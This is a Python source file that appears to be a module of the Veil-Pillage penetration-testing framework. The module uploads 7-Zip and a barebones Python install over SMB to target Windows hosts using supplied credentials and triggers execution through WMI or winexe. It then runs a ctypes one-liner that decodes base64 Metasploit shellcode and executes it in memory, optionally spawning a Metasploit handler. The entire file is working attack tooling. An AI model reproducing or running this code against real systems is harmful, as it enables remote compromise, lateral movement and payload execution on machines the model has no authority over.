"""

Upload a barebones python environment to a host and use it to invoke shellcode.


Module built by @harmj0y

"""

import sys, base64, time, os


from lib import helpers
from lib import messages
from lib import smb
from lib import command_methods
import settings

# Veil-Evasion import for shellcode generation
from modules.common import shellcode

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Python Barebones Injector"
        self.description = "Upload barebones environment and inject shellcode."

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # holder for the argument dictionary passed by the main pillage.py
        # so we can parse command line arguments as necessary
        self.args = args

        # a cleanup file that will be written out by pillage.py
        #   ex- if you're enabling the sticky-keys backdoor on systems
        self.cleanup = ""

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"trigger_method"   : ["wmis", "[wmis] or [winexe] for triggering"],
                                 "spawn_handler"    : ["false", "spawn a meterpreter handler"]}

    def run(self):

        handlerPath = "none"

        # assume single set of credentials
        username, password = self.creds[0]

        triggerMethod = self.required_options["trigger_method"][0]
        spawnHandler = self.required_options["spawn_handler"][0]

        # nab up some shellcode from Veil-Evasion
        sc = shellcode.Shellcode()

        # set the payload to use, if specified
        if self.args.msfpayload:
            sc.SetPayload([self.args.msfpayload, self.args.msfoptions])

        # set custom shellcode if specified
        elif self.args.custshell:
            sc.setCustomShellcode(self.args.custshell)

        # base64 our shellcode
        b64sc = base64.b64encode(sc.generate().decode("string_escape"))


        # re-print the title and module name after shellcode generation (Veil-Evasion trashes this)
        messages.title()
        sys.stdout.write(" [*] Executing module: " + helpers.color(self.name) + "...")

        # if we're using Veil-Evasion's generated handler script, try to spawn it
        if spawnHandler.lower() == "true":
            # turn our shellcode object into a handler script
            handlerPath = helpers.shellcodeToHandler(sc)
            # make sure a handler was returned
            if handlerPath != "":
                # command to spawn a new tab
                cmd = "gnome-terminal --tab -t \"Veil-Pillage Handler\" -x bash -c \"echo ' [*] Spawning Metasploit handler...' && msfconsole -r '" + handlerPath + "'\""
                # invoke msfconsole with the handler script in a new tab
                os.system(cmd)
                raw_input("\n\n [>] Press enter when handler is ready: ")

        # otherwise, if we have a custom handler path, try to invoke that
        elif handlerPath.lower() != "none":
            if os.path.isdir(handlerPath):
                # command to spawn a new tab
                cmd = "gnome-terminal --tab -t \"Veil-Pillage Handler\" -x bash -c \"echo ' [*] Spawning Metasploit handler...' && msfconsole -r '" + handlerPath + "'\""
                # invoke msfconsole with the handler script in a new tab
                os.system(cmd)
                raw_input("\n [>] Press enter when handler is ready: ")
            else:
                print helpers.color(" [!] Warning: handlerPath '"+handlerPath+"' not valid!")
        else: pass


        # command to unzip the uploaded python installation
        unzipCommand = "C:\\\\Windows\\\\Temp\\\\7za.exe x -y -oC:\\\\Windows\\\\Temp\\\\ C:\\\\Windows\\\\Temp\\\\python.zip"
        # path to the 7zip binary
        zipPath = settings.VEIL_PILLAGE_PATH+"/data/environments/7za.exe"

        # command to invoke shellcode using python
        pythonCMD = "C:\\\\Windows\\\\Temp\\\\python\\\\python.exe -c \"from ctypes import *;a=\\\"%s\\\".decode(\\\"base_64\\\");cast(create_string_buffer(a,len(a)),CFUNCTYPE(c_void_p))()\"" %(b64sc)
        # path to the minial python isntall
        pythonPath =  settings.VEIL_PILLAGE_PATH+"/data/environments/python.zip"


        for target in self.targets:

            # upload the 7zip.exe binary and the python install
            uploadResult = smb.uploadFiles(target, username, password, "C$", "\\Windows\\Temp\\", [zipPath, pythonPath])

            if uploadResult == "success":
                self.output += "[*] 7za.exe and python.zip successfully uploaded using creds '"+username+":"+password+"' on "+target+"\n"

                print helpers.color(" [*] Triggering 7zip unzip command on " + target)
                command_methods.executeCommand(target, username, password, unzipCommand, triggerMethod)
                self.output += "[*] 7za unzip command triggered using creds '"+username+":"+password+"' on "+target+" with "+triggerMethod+"\n"

                print helpers.color(" [*] Triggering 'python -c' command on " + target)
                command_methods.executeCommand(target, username, password, pythonCMD, triggerMethod)
                self.output += "[*] 'python -c' inject command triggered using creds '"+username+":"+password+"' on "+target+" with "+triggerMethod+"\n"

                # build our cleanup file -> kill all python processes and delete the environments
                killCMD = "taskkill /f /im python.exe"
                self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+killCMD+"|"+triggerMethod+"\n"
                # command to delete the python extracted directory, zipped python environment and 7za.exe binary
                delCMD = "rmdir c:\\Windows\\Temp\\Python /s /q & del C:\\Windows\\Temp\\python.zip & del C:\\Windows\\Temp\\7za.exe"
                self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+delCMD+"|"+triggerMethod+"\n"

            else:
                self.output += "[!] 7za.exe and python.zip unsuccessfully uploaded using creds '"+username+":"+password+"' on "+target+"\n"
                print helpers.color("[!] 7za.exe and python.zip unsuccessfully uploaded to "+target+"\n", warning=True)
